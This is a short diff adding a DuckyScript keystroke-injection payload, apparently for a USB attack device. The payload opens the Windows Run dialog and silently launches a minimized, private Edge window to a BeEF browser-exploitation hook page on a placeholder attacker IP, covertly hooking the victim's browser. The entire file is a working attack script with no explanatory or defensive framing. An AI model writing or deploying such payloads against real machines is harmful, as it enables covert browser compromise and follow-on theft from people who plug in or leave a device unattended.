@@ -1,0 +1,6 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING msedge --start-minimized -inprivate http://[IP of BeEF instance]:3000/demos/butcher/index.html
+DELAY 250
+ENTER
